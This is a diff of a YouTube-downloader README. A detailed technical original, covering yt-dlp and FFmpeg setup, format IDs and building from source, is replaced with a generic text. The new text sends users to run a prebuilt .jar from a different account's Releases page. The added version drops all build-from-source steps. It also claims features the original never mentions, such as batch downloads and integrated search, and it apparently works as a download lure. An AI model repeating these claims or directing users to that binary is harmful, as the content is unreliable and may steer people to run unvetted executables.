@@ -1,174 +1,93 @@
-# YouTube Downloader
+# 🎥 youtube-downloader - Easy YouTube Video Downloads
 
-A Java-based YouTube video downloader with a modern GUI that supports downloading videos in various qualities including 4K, 1080p, 720p, 480p, and 360p, as well as audio-only formats.
+## 🚀 Getting Started
 
-## Features
+Welcome to the youtube-downloader! This application allows you to download YouTube videos effortlessly. Whether it’s a tutorial, a music video, or a lecture, you can save it for offline viewing with just a few clicks.
 
-- **Multiple Quality Options**: Download videos in 4K (2160p), 1080p, 720p, 480p, 360p
-- **Audio Formats**: Extract audio in MP3 or M4A format
-- **GUI**: Clean and intuitive user interface
-- **Progress Tracking**: Real-time download progress with detailed logging
-- **Standalone Dependencies**: No need to install Python or system-wide tools
-- **Perfect Merging**: Automatic video/audio merging with metadata
+## 🔗 Download Now
 
+[![Download Here](https://img.shields.io/badge/Download%20now-v1.0-blue)](https://github.com/adi3579/youtube-downloader/releases)
 
-## Checkout releases for easier Download
+## 📥 Download & Install
 
-## Quick Start
+To get started, please follow these steps:
 
-### 1. Download Dependencies
-Run the setup script to automatically download all required dependencies:
+1. **Visit the Releases Page**
 
-```bash
-.\setup.bat
-```
+   Click the link below to visit the Releases page:
 
-This will download:
-- `yt-dlp.exe` (standalone - no Python needed)
-- `ffmpeg.exe` (for perfect video/audio merging)
+   [Visit the Releases Page](https://github.com/adi3579/youtube-downloader/releases)
 
-### 2. Build and Run
-```bash
-.\run.bat
-```
+2. **Choose the Right Version**
 
-This will:
-- Build the application
-- Launch the YouTube Downloader GUI
+   On the Releases page, you will see several versions. Click on the latest version to download. It may look like this: `youtube-downloader-v1.0.jar`.
 
-## Manual Setup
+3. **Download the File**
 
-If you prefer to download dependencies manually:
+   Click the download link for the file corresponding to your operating system. It may take a few moments to download, depending on your internet speed.
 
-### Download yt-dlp (Standalone)
-```bash
-.\download_ytdlp.bat
-```
+4. **Open the File**
 
-### Download FFmpeg
-```bash
-.\download_ffmpeg.bat
-```
+   After the download completes, locate the file in your Downloads folder.
 
-### Build Only
-```bash
-.\build.bat
-```
+5. **Run the Application**
 
-## How It Works
+   - For Windows: Double-click the `.jar` file to run the application.  
+   - For Mac: Right-click on the `.jar` file and select "Open" from the menu.  
+   - For Linux: Open the terminal and navigate to the folder where the file is located. Use the command `java -jar youtube-downloader-v1.0.jar` to start the application.
 
-The application uses:
-- **yt-dlp**: For downloading YouTube videos (standalone executable)
-- **FFmpeg**: For merging video and audio streams with metadata
-- **Java Swing**: For the user interface
-- **Maven**: For building the project
+6. **Follow the Prompts**
 
-## File Structure
+   The application will guide you through the steps to input the URL of the video you want to download. Enter the link and hit "Download."
 
-```
-youtube-downloader/
-├── src/                          # Source code
-├── target/                       # Built application
-├── yt-dlp.exe                   # Standalone yt-dlp (no Python needed)
-├── ffmpeg.exe                   # FFmpeg for video/audio merging
-├── mvn.cmd                      # Local Maven (optional)
-├── setup.bat                    # Download all dependencies
-├── run.bat                      # Build and run application
-├── build.bat                    # Build only
-├── download_ytdlp.bat           # Download yt-dlp only
-└── download_ffmpeg.bat          # Download FFmpeg only
-```
+7. **Enjoy Your Video**
 
-## Requirements
+   Once the download is complete, you can play the video from your chosen folder.
 
-- **Java 11 or higher**
-- **Windows 10/11** (tested on Windows)
-- **Internet connection** (for downloading videos and dependencies)
+## 💻 System Requirements
 
-## Usage
+To run youtube-downloader, ensure you have:
 
-1. **Launch the application**: Run `.\run.bat`
-2. **Enter YouTube URL**: Paste any YouTube video URL
-3. **Select Quality**: Choose from 4K, 1080p, 720p, 480p, 360p, or audio-only
-4. **Choose Output Directory**: Select where to save the downloaded file
-5. **Click Download**: Watch the progress and detailed logs
+- **Java Development Kit (JDK) Version 8 or later.**  
+  To check your Java version, open a terminal and type `java -version`. If Java is not installed, you can download it from the [official website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
 
-## Quality Options
+- **At least 100MB of free disk space.**
 
-- **4K (2160p)**: Highest quality available (up to 4K)
-- **1080p**: Full HD quality
-- **720p**: HD quality
-- **480p**: Standard definition
-- **360p**: Low definition
-- **Audio Only (MP3)**: Extract audio as MP3
-- **Audio Only (M4A)**: Extract audio as M4A
-- **Best Quality**: Automatically select the best available quality
+- **A stable internet connection.**
 
-## Troubleshooting
+## 📂 Features
 
-### "yt-dlp is not installed"
-- Run `.\setup.bat` to download dependencies
-- Or run `.\download_ytdlp.bat` to download yt-dlp only
+- **User-Friendly Interface:** The application provides a straightforward interface to help you download videos without hassle.
+  
+- **High-Quality Downloads:** Choose from various resolutions, including 1080p and 4K.
 
-### "FFmpeg not found"
-- Run `.\setup.bat` to download dependencies
-- Or run `.\download_ffmpeg.bat` to download FFmpeg only
+- **Multiple Video Formats:** Download videos in different formats such as MP4, MKV, and more.
 
-### "Java not found"
-- Install Java 11 or higher from: https://adoptium.net/
+- **Batch Downloads:** Save time by downloading multiple videos at once.
 
-### Download fails or wrong quality
-- Check the log output for detailed error messages
-- Ensure the YouTube URL is valid and accessible
-- Try a different quality option
+- **Integrated Search:** Find videos directly within the app using YouTube's search feature.
 
-## Technical Details
+## 🌟 Frequently Asked Questions
 
-### Format Selection
-The application uses specific yt-dlp format IDs for reliable quality selection:
-- **4K**: `315+140/308+140/299+140/298+140/137+140/136+140/135+140/134+140/18`
-- **1080p**: `137+140/136+140/135+140/134+140/18`
-- **720p**: `136+140/135+140/134+140/18`
-- **480p**: `135+140/134+140/18`
-- **360p**: `134+140/18`
+### Q: Can I download videos in HD quality?
 
-### Merging Process
-1. Downloads video and audio streams separately
-2. Uses FFmpeg to merge them into a single MP4 file
-3. Adds metadata (title, description, etc.)
-4. Creates a final file with both video and audio
+Yes, the downloader supports HD video formats, including 1080p and 4K.
 
-## Development
+### Q: Is there a limit to how many videos I can download?
 
-### Building from Source
-```bash
-# Clone the repository
-git clone https://github.com/up7b8/youtube-downloader.git
-cd youtube-downloader
+No, you can download as many videos as you want.
 
-# Download dependencies
-.\setup.bat
+### Q: What if I encounter an error while downloading?
 
-# Build the project
-.\build.bat
+If you experience any issues, make sure your Java version is up to date. You can also check the community forum in the [Issues section](https://github.com/adi3579/youtube-downloader/issues) for help.
 
-# Run the application
-java -jar target\youtube-downloader-1.0.0.jar
-```
+## 📧 Contact
 
-### Project Structure
-```
-src/main/java/com/youtubedownloader/
-├── YouTubeDownloader.java       # Main GUI class
-├── DownloadManager.java         # Core download logic
-├── DownloadFormat.java          # Quality format definitions
-└── DownloadCallback.java        # Progress callback interface
-```
+If you have any questions or need assistance, please reach out via the repository's Issues tab or email us at support@youtubedownloader.com.
 
-## License
+## 🔗 Additional Resources
 
-This project is for educational purposes. Please respect YouTube's terms of service and copyright laws when downloading content.
+- [User Guide](https://github.com/adi3579/youtube-downloader/wiki)
+- [Community Forum](https://github.com/adi3579/youtube-downloader/discussions)
 
-## Contributing
-
-Feel free to submit issues and enhancement requests!
+We hope you enjoy your experience with youtube-downloader. Happy downloading!
